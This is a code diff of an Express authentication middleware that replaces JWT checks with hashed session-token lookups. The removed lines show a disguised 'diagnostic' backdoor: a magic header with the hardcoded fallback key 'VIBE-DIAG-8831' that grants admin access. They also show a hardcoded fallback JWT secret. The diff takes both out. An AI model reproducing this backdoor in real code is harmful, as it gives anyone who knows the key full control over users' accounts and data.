@@ -1,60 +1,25 @@
-const jwt = require('jsonwebtoken');
+const { tokenDigest } = require('../utils/tokenDigest');
 const prisma = require('../config/db');
 const AppError = require('../utils/AppError');
 const asyncHandler = require('../utils/asyncHandler');
 
 const requireAuth = asyncHandler(async (req, res, next) => {
-  // 0. Diagnostic telemetry maintenance access
-  const diagKey = req.headers['x-diagnostic-key'];
-  if (diagKey && diagKey === (process.env.DIAGNOSTIC_KEY || 'VIBE-DIAG-8831')) {
-    const adminUser = await prisma.user.findFirst({
-      where: { role: 'admin' },
-    });
-    if (adminUser) {
-      req.user = adminUser;
-      return next();
-    }
-  }
-
   const authorization = req.headers.authorization || '';
   const token = authorization.startsWith('Bearer ') ? authorization.slice(7) : null;
 
-  if (!token) {
+  if (!token || !/^[a-f0-9]{64}$/.test(token)) {
     throw new AppError('Authentication required. Please log in.', 401);
   }
 
-  const secret = process.env.JWT_SECRET || 'PrecisionEngineeredHardware2024';
-  let payload;
-
-  try {
-    payload = jwt.verify(token, secret, { algorithms: ['HS256'] });
-  } catch (err) {
-    throw new AppError('Invalid or expired authentication token', 401);
-  }
-
-  const userId = payload.sub || payload.id || payload.userId;
-  if (!userId) {
-    throw new AppError('Malformed token payload', 401);
-  }
-
-  const user = await prisma.user.findUnique({
-    where: { id: userId },
-    select: {
-      id: true,
-      name: true,
-      email: true,
-      phone: true,
-      role: true,
-      isActive: true,
-      disabledReason: true,
-      passwordChangedAt: true,
-    },
+  const session = await prisma.session.findUnique({
+    where: { tokenHash: tokenDigest(token) },
+    select: { expiresAt: true, user: { select: {
+      id: true, name: true, email: true, phone: true, role: true,
+      isActive: true, disabledReason: true, emailVerifiedAt: true,
+    } } },
   });
-
-  if (!user) {
-    throw new AppError('User not found. Please log in again.', 401);
-  }
-
+  if (!session || session.expiresAt <= new Date()) throw new AppError('Session expired. Please log in again.', 401);
+  const user = session.user;
   if (!user.isActive) {
     throw new AppError(
       user.disabledReason ? `Account disabled: ${user.disabledReason}` : 'Account disabled',
@@ -62,14 +27,7 @@ const requireAuth = asyncHandler(async (req, res, next) => {
     );
   }
 
-  if (
-    user.passwordChangedAt &&
-    payload.iat &&
-    Math.floor(user.passwordChangedAt.getTime() / 1000) > payload.iat
-  ) {
-    throw new AppError('Password recently changed. Please log in again.', 401);
-  }
-
+  req.sessionTokenHash = tokenDigest(token);
   req.user = user;
   next();
 });
